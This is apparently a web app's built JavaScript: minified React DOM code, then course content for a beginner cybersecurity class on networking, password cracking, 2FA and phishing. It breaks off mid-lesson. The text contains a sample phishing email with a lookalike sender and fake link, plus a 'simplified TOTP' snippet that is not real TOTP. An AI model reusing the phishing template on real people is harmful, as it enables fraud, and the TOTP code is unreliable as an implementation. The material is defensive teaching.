Promise(function(u,r){c.onload=u,c.onerror=r}),rt(i,"link",l),a.instance=i}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(a,t),(t=a.state.preload)&&(a.state.loading&3)===0&&(e.count++,a=gs.bind(e),t.addEventListener("load",a),t.addEventListener("error",a))}}var Lu=0;function Cp(e,t){return e.stylesheets&&e.count===0&&Ss(e,e.stylesheets),0<e.count||0<e.imgCount?function(a){var l=setTimeout(function(){if(e.stylesheets&&Ss(e,e.stylesheets),e.unsuspend){var i=e.unsuspend;e.unsuspend=null,i()}},6e4+t);0<e.imgBytes&&Lu===0&&(Lu=62500*np());var n=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&Ss(e,e.stylesheets),e.unsuspend)){var i=e.unsuspend;e.unsuspend=null,i()}},(e.imgBytes>Lu?50:800)+t);return e.unsuspend=a,function(){e.unsuspend=null,clearTimeout(l),clearTimeout(n)}}:null}function gs(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)Ss(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var vs=null;function Ss(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,vs=new Map,t.forEach(jp,e),vs=null,gs.call(e))}function jp(e,t){if(!(t.state.loading&4)){var a=vs.get(e);if(a)var l=a.get(null);else{a=new Map,vs.set(e,a);for(var n=e.querySelectorAll("link[data-precedence],style[data-precedence]"),i=0;i<n.length;i++){var c=n[i];(c.nodeName==="LINK"||c.getAttribute("media")!=="not all")&&(a.set(c.dataset.precedence,c),l=c)}l&&a.set(null,l)}n=t.instance,c=n.getAttribute("data-precedence"),i=a.get(c)||l,i===l&&a.set(null,n),a.set(c,n),this.count++,l=gs.bind(this),n.addEventListener("load",l),n.addEventListener("error",l),i?i.parentNode.insertBefore(n,i.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(n,e.firstChild)),t.state.loading|=4}}var $n={$$typeof:G,Provider:null,Consumer:null,_currentValue:Z,_currentValue2:Z,_threadCount:0};function Ap(e,t,a,l,n,i,c,u,r){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=fn(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=fn(0),this.hiddenUpdates=fn(null),this.identifierPrefix=l,this.onUncaughtError=n,this.onCaughtError=i,this.onRecoverableError=c,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=r,this.incompleteTransitions=new Map}function Yf(e,t,a,l,n,i,c,u,r,y,x,A){return e=new Ap(e,t,a,c,r,y,x,A,u),t=1,i===!0&&(t|=24),i=wt(3,null,null,t),e.current=i,i.stateNode=e,t=yc(),t.refCount++,e.pooledCache=t,t.refCount++,i.memoizedState={element:l,isDehydrated:a,cache:t},bc(i),e}function qf(e){return e?(e=Hl,e):Hl}function Gf(e,t,a,l,n,i){n=qf(n),l.context===null?l.context=n:l.pendingContext=n,l=Ma(t),l.payload={element:a},i=i===void 0?null:i,i!==null&&(l.callback=i),a=Da(e,l,t),a!==null&&(Ct(a,e,t),On(a,e,t))}function Vf(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var a=e.retryLane;e.retryLane=a!==0&&a<t?a:t}}function Uu(e,t){Vf(e,t),(e=e.alternate)&&Vf(e,t)}function Xf(e){if(e.tag===13||e.tag===31){var t=nl(e,67108864);t!==null&&Ct(t,e,67108864),Uu(e,67108864)}}function Qf(e){if(e.tag===13||e.tag===31){var t=Dt();t=N(t);var a=nl(e,t);a!==null&&Ct(a,e,t),Uu(e,t)}}var bs=!0;function Ep(e,t,a,l){var n=b.T;b.T=null;var i=k.p;try{k.p=2,Bu(e,t,a,l)}finally{k.p=i,b.T=n}}function wp(e,t,a,l){var n=b.T;b.T=null;var i=k.p;try{k.p=8,Bu(e,t,a,l)}finally{k.p=i,b.T=n}}function Bu(e,t,a,l){if(bs){var n=Yu(l);if(n===null)ju(e,t,l,xs,a),Zf(e,l);else if(zp(n,e,t,a,l))l.stopPropagation();else if(Zf(e,l),t&4&&-1<Op.indexOf(e)){for(;n!==null;){var i=ia(n);if(i!==null)switch(i.tag){case 3:if(i=i.stateNode,i.current.memoizedState.isDehydrated){var c=na(i.pendingLanes);if(c!==0){var u=i;for(u.pendingLanes|=2,u.entangledLanes|=2;c;){var r=1<<31-gt(c);u.entanglements[1]|=r,c&=~r}ea(i),(Te&6)===0&&(ls=pt()+500,Qn(0))}}break;case 31:case 13:u=nl(i,2),u!==null&&Ct(u,i,2),is(),Uu(i,2)}if(i=Yu(l),i===null&&ju(e,t,l,xs,a),i===n)break;n=i}n!==null&&l.stopPropagation()}else ju(e,t,l,null,a)}}function Yu(e){return e=Gs(e),qu(e)}var xs=null;function qu(e){if(xs=null,e=lt(e),e!==null){var t=J(e);if(t===null)e=null;else{var a=t.tag;if(a===13){if(e=ce(t),e!==null)return e;e=null}else if(a===31){if(e=Me(t),e!==null)return e;e=null}else if(a===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return xs=e,null}function Kf(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(si()){case ci:return 2;case ui:return 8;case Sl:case dn:return 32;case oi:return 268435456;default:return 32}default:return 32}}var Gu=!1,Xa=null,Qa=null,Ka=null,In=new Map,Pn=new Map,Za=[],Op="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function Zf(e,t){switch(e){case"focusin":case"focusout":Xa=null;break;case"dragenter":case"dragleave":Qa=null;break;case"mouseover":case"mouseout":Ka=null;break;case"pointerover":case"pointerout":In.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Pn.delete(t.pointerId)}}function ei(e,t,a,l,n,i){return e===null||e.nativeEvent!==i?(e={blockedOn:t,domEventName:a,eventSystemFlags:l,nativeEvent:i,targetContainers:[n]},t!==null&&(t=ia(t),t!==null&&Xf(t)),e):(e.eventSystemFlags|=l,t=e.targetContainers,n!==null&&t.indexOf(n)===-1&&t.push(n),e)}function zp(e,t,a,l,n){switch(t){case"focusin":return Xa=ei(Xa,e,t,a,l,n),!0;case"dragenter":return Qa=ei(Qa,e,t,a,l,n),!0;case"mouseover":return Ka=ei(Ka,e,t,a,l,n),!0;case"pointerover":var i=n.pointerId;return In.set(i,ei(In.get(i)||null,e,t,a,l,n)),!0;case"gotpointercapture":return i=n.pointerId,Pn.set(i,ei(Pn.get(i)||null,e,t,a,l,n)),!0}return!1}function Wf(e){var t=lt(e.target);if(t!==null){var a=J(t);if(a!==null){if(t=a.tag,t===13){if(t=ce(a),t!==null){e.blockedOn=t,M(e.priority,function(){Qf(a)});return}}else if(t===31){if(t=Me(a),t!==null){e.blockedOn=t,M(e.priority,function(){Qf(a)});return}}else if(t===3&&a.stateNode.current.memoizedState.isDehydrated){e.blockedOn=a.tag===3?a.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Ts(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var a=Yu(e.nativeEvent);if(a===null){a=e.nativeEvent;var l=new a.constructor(a.type,a);qs=l,a.target.dispatchEvent(l),qs=null}else return t=ia(a),t!==null&&Xf(t),e.blockedOn=a,!1;t.shift()}return!0}function Jf(e,t,a){Ts(e)&&a.delete(t)}function kp(){Gu=!1,Xa!==null&&Ts(Xa)&&(Xa=null),Qa!==null&&Ts(Qa)&&(Qa=null),Ka!==null&&Ts(Ka)&&(Ka=null),In.forEach(Jf),Pn.forEach(Jf)}function Ns(e,t){e.blockedOn===t&&(e.blockedOn=null,Gu||(Gu=!0,w.unstable_scheduleCallback(w.unstable_NormalPriority,kp)))}var Cs=null;function Ff(e){Cs!==e&&(Cs=e,w.unstable_scheduleCallback(w.unstable_NormalPriority,function(){Cs===e&&(Cs=null);for(var t=0;t<e.length;t+=3){var a=e[t],l=e[t+1],n=e[t+2];if(typeof l!="function"){if(qu(l||a)===null)continue;break}var i=ia(a);i!==null&&(e.splice(t,3),t-=3,Yc(i,{pending:!0,data:n,method:a.method,action:l},l,n))}}))}function sn(e){function t(r){return Ns(r,e)}Xa!==null&&Ns(Xa,e),Qa!==null&&Ns(Qa,e),Ka!==null&&Ns(Ka,e),In.forEach(t),Pn.forEach(t);for(var a=0;a<Za.length;a++){var l=Za[a];l.blockedOn===e&&(l.blockedOn=null)}for(;0<Za.length&&(a=Za[0],a.blockedOn===null);)Wf(a),a.blockedOn===null&&Za.shift();if(a=(e.ownerDocument||e).$$reactFormReplay,a!=null)for(l=0;l<a.length;l+=3){var n=a[l],i=a[l+1],c=n[de]||null;if(typeof i=="function")c||Ff(a);else if(c){var u=null;if(i&&i.hasAttribute("formAction")){if(n=i,c=i[de]||null)u=c.formAction;else if(qu(n)!==null)continue}else u=c.action;typeof u=="function"?a[l+1]=u:(a.splice(l,3),l-=3),Ff(a)}}}function $f(){function e(i){i.canIntercept&&i.info==="react-transition"&&i.intercept({handler:function(){return new Promise(function(c){return n=c})},focusReset:"manual",scroll:"manual"})}function t(){n!==null&&(n(),n=null),l||setTimeout(a,20)}function a(){if(!l&&!navigation.transition){var i=navigation.currentEntry;i&&i.url!=null&&navigation.navigate(i.url,{state:i.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var l=!1,n=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",t),navigation.addEventListener("navigateerror",t),setTimeout(a,100),function(){l=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",t),navigation.removeEventListener("navigateerror",t),n!==null&&(n(),n=null)}}}function Vu(e){this._internalRoot=e}js.prototype.render=Vu.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(m(409));var a=t.current,l=Dt();Gf(a,l,e,t,null,null)},js.prototype.unmount=Vu.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;Gf(e.current,2,null,e,null,null),is(),t[Le]=null}};function js(e){this._internalRoot=e}js.prototype.unstable_scheduleHydration=function(e){if(e){var t=E();e={blockedOn:null,target:e,priority:t};for(var a=0;a<Za.length&&t!==0&&t<Za[a].priority;a++);Za.splice(a,0,e),a===0&&Wf(e)}};var If=B.version;if(If!=="19.2.4")throw Error(m(527,If,"19.2.4"));k.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(m(188)):(e=Object.keys(e).join(","),Error(m(268,e)));return e=j(t),e=e!==null?ue(e):null,e=e===null?null:e.stateNode,e};var Mp={bundleType:0,version:"19.2.4",rendererPackageName:"react-dom",currentDispatcherRef:b,reconcilerVersion:"19.2.4"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var As=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!As.isDisabled&&As.supportsFiber)try{Fa=As.inject(Mp),yt=As}catch{}}return ai.createRoot=function(e,t){if(!H(e))throw Error(m(299));var a=!1,l="",n=nd,i=id,c=sd;return t!=null&&(t.unstable_strictMode===!0&&(a=!0),t.identifierPrefix!==void 0&&(l=t.identifierPrefix),t.onUncaughtError!==void 0&&(n=t.onUncaughtError),t.onCaughtError!==void 0&&(i=t.onCaughtError),t.onRecoverableError!==void 0&&(c=t.onRecoverableError)),t=Yf(e,1,!1,null,null,a,l,null,n,i,c,$f),e[Le]=t.current,Cu(e),new Vu(t)},ai.hydrateRoot=function(e,t,a){if(!H(e))throw Error(m(299));var l=!1,n="",i=nd,c=id,u=sd,r=null;return a!=null&&(a.unstable_strictMode===!0&&(l=!0),a.identifierPrefix!==void 0&&(n=a.identifierPrefix),a.onUncaughtError!==void 0&&(i=a.onUncaughtError),a.onCaughtError!==void 0&&(c=a.onCaughtError),a.onRecoverableError!==void 0&&(u=a.onRecoverableError),a.formState!==void 0&&(r=a.formState)),t=Yf(e,1,!0,t,a??null,l,n,r,i,c,u,$f),t.context=qf(null),a=t.current,l=Dt(),l=N(l),n=Ma(l),n.callback=null,Da(a,n,l),a=l,t.current.lanes=a,Ia(t,a),ea(t),e[Le]=t.current,Cu(e),new js(t)},ai.version="19.2.4",ai}var uh;function Gp(){if(uh)return Ku.exports;uh=1;function w(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(w)}catch(B){console.error(B)}}return w(),Ku.exports=qp(),Ku.exports}var Vp=Gp();const Qt={title:"Cybersecurity",subtitle:"Learn to protect yourself and hack ethically",chapters:[{id:1,title:"Welcome to Cybersecurity",description:"What hackers do and why it matters",lessons:[{id:"1-1",title:"What is Cybersecurity?",duration:"8 min",content:`
## Welcome, Future Cyber Defender! 🛡️

Every day, hackers attack millions of computers, phones, and websites. **Cybersecurity** is the art of defending against these attacks — and understanding how they work.

### Why Should You Care?

Think about everything connected to the internet:
- Your phone 📱
- Your gaming console 🎮
- Smart TVs, cameras, doorbells 📷
- Cars, hospitals, power plants ⚡

ALL of these can be hacked. And someone needs to protect them.

### The Three Types of Hackers

| Type | Also Called | What They Do |
|------|-----------|-------------|
| **White Hat** | Ethical Hacker | Gets paid to find & fix security holes |
| **Black Hat** | Criminal Hacker | Breaks into systems illegally |
| **Gray Hat** | Somewhere in between | Finds bugs without permission, but reports them |

### What You'll Learn

In this course, you'll think like a hacker (the good kind!):

✅ How passwords get cracked
✅ How websites get hacked
✅ How to spot phishing scams
✅ How to protect your accounts
✅ How encryption works
✅ How to analyze network traffic
✅ Real hacking tools (used ethically!)

### The CIA Triad

The foundation of all cybersecurity:

- **C**onfidentiality — Only authorized people see the data
- **I**ntegrity — Data hasn't been tampered with
- **A**vailability — Systems are up and running when needed

\`\`\`
       Confidentiality
           /\\
          /  \\
         /    \\
        /  CIA  \\
       /________\\
  Integrity    Availability
\`\`\`

Every security decision balances these three goals.

### Real-World Cyber Attacks

| Attack | Year | What Happened |
|--------|------|--------------|
| Yahoo Breach | 2013 | 3 billion accounts stolen |
| WannaCry | 2017 | Ransomware hit 200,000 computers |
| SolarWinds | 2020 | Hackers infiltrated US government |
| Colonial Pipeline | 2021 | Shut down fuel supply for days |

<tip>
💡 Cybersecurity jobs pay $80,000-$200,000+ and there's a massive shortage of skilled workers!
</tip>

### The Golden Rule

**Never hack anything you don't have permission to hack.**

This course teaches you skills for defense and ethical hacking ONLY. Using these skills illegally can land you in serious trouble.

### Defense in Depth

Professional security uses **multiple layers** of protection:

\`\`\`
Layer 1: Physical Security    → Locks, badges, cameras
Layer 2: Network Security     → Firewalls, IDS/IPS
Layer 3: Endpoint Security    → Antivirus, patching
Layer 4: Application Security → Input validation, auth
Layer 5: Data Security        → Encryption, backups
Layer 6: Human Security       → Training, awareness
\`\`\`

If one layer fails, the others still protect you. This is why we don't rely on just passwords or just firewalls — we use everything together.

### Common Attack Categories

\`\`\`
PASSIVE ATTACKS (listening):
├── Eavesdropping (sniffing network traffic)
├── Traffic analysis (who's talking to whom)
└── Keylogging (recording keystrokes)

ACTIVE ATTACKS (interfering):
├── Man-in-the-Middle (intercepting communications)
├── Denial of Service (flooding with traffic)
├── SQL Injection (attacking databases)
├── Phishing (fake emails/websites)
└── Ransomware (encrypting files for ransom)
\`\`\`

### Cybersecurity Career Paths

\`\`\`
Entry Level:
  Security Analyst       → $60-90K
  SOC Analyst            → $55-85K
  IT Auditor             → $60-90K

Mid Level:
  Penetration Tester     → $80-130K
  Security Engineer      → $90-140K
  Incident Responder     → $85-130K

Senior Level:
  Security Architect     → $130-200K
  CISO                   → $150-300K
  Red Team Lead          → $120-180K
\`\`\`

### Key Certifications

| Certification | Level | Focus |
|--------------|-------|-------|
| CompTIA Security+ | Entry | General security |
| CEH | Intermediate | Ethical hacking |
| OSCP | Advanced | Penetration testing |
| CISSP | Senior | Security management |

Ready to become a cyber defender? Let's go! 🚀
          `},{id:"1-2",title:"How the Internet Actually Works",duration:"10 min",content:`
## Under the Hood of the Internet 🌐

To defend the internet, you need to understand how it works!

### IP Addresses — Your Digital Address

Every device on the internet has an **IP address**:

\`\`\`
Your computer:  192.168.1.100  (private/local)
Google's server: 142.250.80.46  (public)
\`\`\`

**IPv4**: 4 numbers, 0-255 each → \`192.168.1.1\`
**IPv6**: Longer, newer format → \`2001:0db8:85a3::8a2e:0370:7334\`

### DNS — The Internet's Phone Book

When you type \`google.com\`, your computer asks a **DNS server**: "What's the IP for google.com?"

\`\`\`
You → "What IP is google.com?"
DNS → "It's 142.250.80.46"
You → connects to 142.250.80.46
\`\`\`

\`\`\`bash
# Try it yourself! Open terminal and type:
nslookup google.com

# Or:
ping google.com
\`\`\`

### Ports — Doors Into a Computer

Each computer has **65,535 ports**. Think of them as doors:

| Port | Service | What It Does |
|------|---------|-------------|
| 80 | HTTP | Regular websites |
| 443 | HTTPS | Secure websites |
| 22 | SSH | Remote access |
| 25 | SMTP | Email sending |
| 3306 | MySQL | Databases |

<warning>
⚠️ Open ports are like unlocked doors — hackers scan for them!
</warning>

### HTTP vs HTTPS

\`\`\`
HTTP  = Sending a postcard (anyone can read it)
HTTPS = Sending a sealed letter (encrypted!)
\`\`\`

Always check for the 🔒 lock icon in your browser!

### Packets — How Data Travels

Data doesn't travel as one big file. It's broken into **packets**:

\`\`\`
Your message: "Hello World!"

Split into packets:
[Packet 1] "Hel" → Route A → ✓
[Packet 2] "lo "  → Route B → ✓
[Packet 3] "Wor" → Route A → ✓
[Packet 4] "ld!" → Route C → ✓

Reassembled: "Hello World!"
\`\`\`

Each packet contains:
- **Source IP** — Where it came from
- **Destination IP** — Where it's going
- **Data** — The actual content
- **Checksum** — Verify it wasn't corrupted

### The OSI Model (Simplified)

\`\`\`
7. Application  ← You interact here (browser, email)
6. Presentation ← Data formatting (encryption)
5. Session      ← Connection management
4. Transport    ← TCP/UDP (reliable delivery)
3. Network      ← IP addresses, routing
2. Data Link    ← MAC addresses, switches
1. Physical     ← Cables, Wi-Fi signals
\`\`\`

<tip>
💡 Hackers can attack at ANY layer. That's why security needs to cover all of them!
</tip>

### Try It: See Your Network Info

\`\`\`bash
# Windows
ipconfig

# Mac/Linux
ifconfig
# or
ip addr

# See your public IP
curl ifconfig.me
\`\`\`

### TCP vs UDP

Two main protocols for sending data:

\`\`\`
TCP (Transmission Control Protocol):
├── Reliable — guarantees delivery
├── Ordered — packets arrive in sequence
├── Handshake — connection established first
├── Used for: Web, email, file transfers
└── Analogy: Registered mail (tracked, confirmed)

UDP (User Datagram Protocol):
├── Fast — no handshake needed
├── Unreliable — packets might get lost
├── Unordered — packets may arrive out of order
├── Used for: Gaming, video streaming, DNS
└── Analogy: Throwing a paper airplane (fast, no guarantee)
\`\`\`

### The TCP Three-Way Handshake

\`\`\`
Client → SYN      → Server   "Hey, want to connect?"
Client ← SYN-ACK ← Server   "Sure! Ready when you are."
Client → ACK      → Server   "Great, let's go!"
         [Connection established!]
\`\`\`

<tip>
💡 A SYN Flood attack sends millions of SYN packets but never completes the handshake — overwhelming the server with half-open connections!
</tip>

### Traceroute — Follow the Path

See every router your data passes through:

\`\`\`bash
# Windows
tracert google.com

# Mac/Linux  
traceroute google.com

# Example output:
1  router.local (192.168.1.1)     1 ms
2  isp-gateway (10.0.0.1)         8 ms
3  backbone.net (72.14.232.1)    15 ms
4  google.com (142.250.80.46)    20 ms
\`\`\`

Each "hop" is a router between you and the destination. More hops = more potential attack points!

### ARP — Address Resolution Protocol

ARP links IP addresses to physical MAC addresses on your local network:

\`\`\`bash
# See your ARP table:
arp -a

# Output:
# 192.168.1.1   →  aa:bb:cc:dd:ee:ff  (your router)
# 192.168.1.50  →  11:22:33:44:55:66  (another device)
\`\`\`

<warning>
⚠️ ARP Spoofing is a common attack where a hacker sends fake ARP messages to redirect traffic through their machine!
</warning>

Understanding networking is the foundation of cybersecurity! 🎯
          `}]},{id:2,title:"Passwords & Authentication",description:"How passwords get cracked and how to stay safe",lessons:[{id:"2-1",title:"How Passwords Get Cracked",duration:"12 min",content:`
## Password Cracking 101 🔓

Passwords are the #1 way we protect accounts. And the #1 thing hackers target.

### How Passwords Are Stored

Websites DON'T store your actual password (usually). They store a **hash**:

\`\`\`
Your password: "minecraft123"
        ↓ Hash Function (SHA-256)
Stored hash: "a1b2c3d4e5f6789..."
\`\`\`

A hash is a one-way function — you can't reverse it to get the password back.

\`\`\`python
# Python example of hashing
import hashlib

password = "minecraft123"
hashed = hashlib.sha256(password.encode()).hexdigest()
print(hashed)
# Output: a1b2c3d4e5f6... (always the same for same input!)
\`\`\`

### Attack #1: Brute Force

Try EVERY possible combination:

\`\`\`
Trying: a        ✗
Trying: b        ✗
Trying: c        ✗
...
Trying: aa       ✗
Trying: ab       ✗
...
(This takes forever for long passwords!)
\`\`\`

| Password Length | Possible Combos | Time to Crack |
|----------------|----------------|--------------|
| 4 characters | 14 million | Instant |
| 6 characters | 19 billion | Seconds |
| 8 characters | 6 trillion | Hours |
| 12 characters | 95 sextillion | Centuries |
| 16 characters | ... | Heat death of universe |

### Attack #2: Dictionary Attack

Use a list of common passwords:

\`\`\`
password       ✗
123456         ✗
qwerty         ✗
minecraft123   ✓ FOUND!
\`\`\`

### The Most Common Passwords (DON'T use these!)

1. 123456
2. password
3. 123456789
4. qwerty
5. abc123
6. password1
7. iloveyou
8. 12345678

<warning>
⚠️ If your password is on this list, change it RIGHT NOW!
</warning>

### Attack #3: Rainbow Tables

Pre-computed hashes for millions of passwords:

\`\`\`
"password"    → 5e884898da28047...
"123456"      → 8d969eef6ecad3c...
"minecraft"   → 7c9e7c1b2d4f8a1...
\`\`\`

Hackers just look up the hash! That's why websites use **salting**:

\`\`\`
password + random_salt → unique_hash
"minecraft" + "x7k2" → "completely_different_hash"
"minecraft" + "p9m1" → "another_different_hash"
\`\`\`

Same password, different salt = different hash. Rainbow tables become useless!

### Attack #4: Credential Stuffing

1. Hacker gets leaked passwords from Site A
2. Tries same email/password on Site B, C, D...
3. People reuse passwords → accounts get hacked

<tip>
💡 This is why you should NEVER reuse passwords across different sites!
</tip>

### How to Make Strong Passwords

**Bad:** \`minecraft123\` (dictionary word + numbers)
**Better:** \`M!n3cr@ft_2024!\` (substitutions)
**Best:** \`correct-horse-battery-staple\` (passphrase!)

Passphrases are:
- Easy to remember
- Hard to crack
- Long = more secure

\`\`\`
4 random words = 20+ characters = extremely secure
"purple-elephant-dancing-tuesday"
\`\`\`

### Attack #5: Credential Stuffing

Using stolen username/password pairs from data breaches on OTHER sites:

\`\`\`
Data breach: LinkedIn passwords leaked (2016)
Hacker gets: john@email.com : MyPass123

Tries the SAME credentials on:
├── Gmail       → ✓ WORKS (same password!)
├── Facebook    → ✓ WORKS
├── Amazon      → ✓ WORKS
└── Bank        → ✓ WORKS (catastrophic!)
\`\`\`

This is why you should NEVER reuse passwords!

### Salting — The Defense Against Rainbow Tables

\`\`\`
WITHOUT SALT:
"password123" → always produces the same hash
Hacker pre-computes: hash → password (rainbow table)

WITH SALT:
"password123" + "x7kJ9m" → unique hash #1
"password123" + "pQ3nR2" → completely different hash #2

Same password, different salts = different hashes!
Now rainbow tables are useless because every hash is unique.
\`\`\`

\`\`\`python
# Proper password hashing with salt (bcrypt)
import bcrypt

password = b"MySecurePassword123"

# Generate salt and hash
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password, salt)
print(f"Salt: {salt}")
print(f"Hash: {hashed}")

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches!")
\`\`\`

### Check If You've Been Breached

\`\`\`
Go to: haveibeenpwned.com
Enter your email address
See which data breaches include your info!

If you're in a breach:
1. Change that password IMMEDIATELY
2. Change it on any other site where you used it
3. Enable 2FA on the breached account
4. Monitor for suspicious activity
\`\`\`

<warning>
⚠️ The average person's email appears in 2-3 data breaches. Check yours now!
</warning>

### Password Strength Calculator

\`\`\`python
import math
import string

def calculate_strength(password):
    """Calculate password entropy in bits."""
    charset_size = 0
    if any(c in string.ascii_lowercase for c in password):
        charset_size += 26
    if any(c in string.ascii_uppercase for c in password):
        charset_size += 26
    if any(c in string.digits for c in password):
        charset_size += 10
    if any(c in string.punctuation for c in password):
        charset_size += 32
    
    entropy = len(password) * math.log2(charset_size)
    
    if entropy < 28:
        strength = "VERY WEAK"
    elif entropy < 36:
        strength = "WEAK"
    elif entropy < 60:
        strength = "MODERATE"
    elif entropy < 80:
        strength = "STRONG"
    else:
        strength = "VERY STRONG"
    
    return entropy, strength

bits, rating = calculate_strength("P@ssw0rd123!")
print(f"Entropy: {bits:.0f} bits — {rating}")
\`\`\`

You now understand how hackers crack passwords! 🎓
          `},{id:"2-2",title:"Two-Factor Authentication",duration:"8 min",content:`
## The Extra Lock on Your Door 🔐

Even the strongest password can be stolen. That's where **2FA** comes in!

### What is 2FA?

Two-Factor Authentication requires TWO things to log in:

\`\`\`
Factor 1: Something you KNOW (password)
    +
Factor 2: Something you HAVE (phone/key)
    =
Much harder to hack!
\`\`\`

### Types of 2FA

| Method | Security | Convenience |
|--------|----------|------------|
| SMS Code | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| Authenticator App | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Hardware Key (YubiKey) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Biometric (fingerprint) | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### Why SMS 2FA is Weak

**SIM Swapping Attack:**
1. Hacker calls your phone carrier
2. Pretends to be you
3. Transfers your number to their SIM
4. Now THEY get your SMS codes!

\`\`\`
Hacker: "Hi, I lost my phone. Can you transfer 
         my number to this new SIM?"
Carrier: "Sure! What's your mother's maiden name?"
Hacker: (found it on social media) "Smith"
Carrier: "Done!"
Your 2FA codes: → Hacker's phone 😱
\`\`\`

### Authenticator Apps (Recommended!)

Apps like **Google Authenticator** or **Authy** generate codes that change every 30 seconds:

\`\`\`
Your app shows: 847 291
                ████████░░ (25 seconds left)

After 30 seconds: 163 502
                  ██░░░░░░░░ (new code!)
\`\`\`

### How TOTP Works

\`\`\`
Secret Key (shared once) + Current Time
        ↓
    HMAC Algorithm
        ↓
    6-digit code
\`\`\`

\`\`\`python
# Simplified TOTP concept
import time
import hashlib

secret = "JBSWY3DPEHPK3PXP"
time_step = int(time.time() / 30)  # Changes every 30 sec
code = hashlib.sha1(f"{secret}{time_step}".encode()).hexdigest()[-6:]
print(f"Your code: {code}")
\`\`\`

### Hardware Security Keys

Physical USB keys (like YubiKey):
- Plug in and tap to authenticate
- **Impossible** to phish remotely
- Used by Google employees (zero phishing since adoption!)

### Set Up 2FA NOW!

Priority accounts to protect:
1. **Email** (password reset for everything!)
2. **Banking/Financial**
3. **Social Media**
4. **Gaming accounts** (Steam, etc.)

<tip>
💡 Always save your **backup codes** when setting up 2FA! Store them somewhere safe offline.
</tip>

### Password Managers

Use one to generate and store unique passwords:
- **Bitwarden** (free, open source)
- **1Password** (paid, great UI)
- **KeePass** (free, local only)

\`\`\`
Without manager: Same password everywhere 😰
With manager: Unique 24-char password per site 💪
\`\`\`

You only need to remember ONE master password!

Enable 2FA on everything. It's the single best thing you can do for security! 🔐
          `}]},{id:3,title:"Social Engineering",description:"Hacking the human mind",lessons:[{id:"3-1",title:"Phishing Attacks",duration:"10 min",content:`
## The Art of Deception 🎣

The easiest way to hack someone? **Ask them for their password.** Seriously.

### What is Phishing?

Fake emails/messages that trick you into giving up information:

\`\`\`
From: security@amaz0n.com  ← Notice the ZERO!
Subject: Your account has been compromised!

Dear Customer,

We detected suspicious activity. Click here to 
verify your identity immediately or your account 
will be suspended in 24 hours!

[VERIFY NOW] ← Links to fake-amazon-login.com
\`\`\`

### Spot the Red Flags 🚩

1. **Urgency** — "Act NOW or else!"
2. **Fear** — "Your account is compromised!"
3. **Bad sender** — \`security@amaz0n.com\` (not amazon.com)
4. **Suspicious links** — Hover before clicking!
5. **Grammar errors** — "Dear Valued Customers"
6. **Generic greeting** — "Dear Customer" not your name
7. **Too good to be true** — "You won $1,000,000!"

### Types of Phishing

| Type | Target | Example |
|------|--------|---------|
| **Phishing** | Anyone | Mass fake emails |
| **Spear Phishing** | Specific person | Researched, personalized |
| **Whaling** | CEO/executives | High-value targets |
| **Smishing** | Via SMS | "Your package is delayed" |
| **Vishing** | Via phone call | "This is the IRS..." |

### Real Phishing Examples

**Fake Login Page:**
\`\`\`
Real:  https://accounts.google.com/login
Fake:  https://accounts.g00gle.com/login  ← zeros!
